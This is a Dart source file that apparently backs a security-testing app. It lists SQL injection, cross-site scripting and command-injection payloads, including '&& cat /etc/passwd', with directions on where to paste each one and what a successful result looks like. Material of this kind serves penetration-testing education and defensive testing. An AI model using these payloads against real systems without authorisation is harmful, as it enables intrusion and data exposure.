import 'package:material_symbols_icons/symbols.dart';
import 'security_payload_models.dart';

class SecurityPayloadData {
  static const List<VulnerabilityCategory> webCategories = [
    VulnerabilityCategory(
      name: 'SQL Injection',
      description: 'Injecting malicious SQL queries to manipulate back-end databases.',
      icon: Symbols.database,
      payloads: [
        SecurityPayload(
          name: 'Basic Bypass',
          payload: "' OR 1=1 --",
          description: 'Classic authentication bypass attempt.',
          howToTest: 'Paste into username or password fields.',
          successIndicator: 'Successful login without a valid password.',
          risk: PayloadRisk.high,
        ),
        SecurityPayload(
          name: 'Error-based',
          payload: "' AND 1=CONVERT(int, (SELECT @@version))",
          description: 'Forces the database to reveal version information in an error message.',
          howToTest: 'Inject into URL parameters or input fields.',
          successIndicator: 'Application displays a database error containing version strings.',
          risk: PayloadRisk.medium,
        ),
        SecurityPayload(
          name: 'Union-based',
          payload: "' UNION SELECT NULL, version(), user() --",
          description: 'Appends results from another query to the original result set.',
          howToTest: 'Inject into a search field or item ID.',
          successIndicator: 'Database details appear on the page where data is normally displayed.',
          risk: PayloadRisk.critical,
        ),
      ],
    ),
    VulnerabilityCategory(
      name: 'Cross-Site Scripting (XSS)',
      description: 'Injecting client-side scripts into web pages viewed by other users.',
      icon: Symbols.code,
      payloads: [
        SecurityPayload(
          name: 'Simple Alert',
          payload: '<script>alert(1)</script>',
          description: 'Basic test to see if script tags are executed.',
          howToTest: 'Paste into comments, profiles, or search bars.',
          successIndicator: 'A browser alert box with "1" appears.',
          risk: PayloadRisk.high,
        ),
        SecurityPayload(
          name: 'Image OnError',
          payload: '<img src=x onerror=alert(1)>',
          description: 'Bypasses filters that block <script> tags.',
          howToTest: 'Paste into HTML-supporting fields.',
          successIndicator: 'A browser alert box appears when the image fails to load.',
          risk: PayloadRisk.high,
        ),
        SecurityPayload(
          name: 'SVG Vector',
          payload: '<svg onload=alert(1)>',
          description: 'Another vector that often bypasses simple sanitization.',
          howToTest: 'Inject into areas allowing rich text or file uploads.',
          successIndicator: 'A browser alert box appears.',
          risk: PayloadRisk.medium,
        ),
      ],
    ),
  ];

  static const List<VulnerabilityCategory> systemCategories = [
    VulnerabilityCategory(
      name: 'Command Injection',
      description: 'Executing arbitrary system commands on the host OS.',
      icon: Symbols.terminal,
      payloads: [
        SecurityPayload(
          name: 'Basic Pipe',
          payload: '; ls -la',
          description: 'Chains a command after the intended one.',
          howToTest: 'Inject into fields that might be passed to a shell (e.g., printer names, IP lookups).',
          successIndicator: 'Output of the directory listing appears in the UI.',
          risk: PayloadRisk.critical,
        ),
        SecurityPayload(
          name: 'Logical AND',
          payload: '&& cat /etc/passwd',
          description: 'Executes the second command if the first succeeds.',
          howToTest: 'Inject into system-command parameters.',
          successIndicator: 'System file contents are revealed.',
          risk: PayloadRisk.critical,
        ),
      ],
    ),
  ];
}
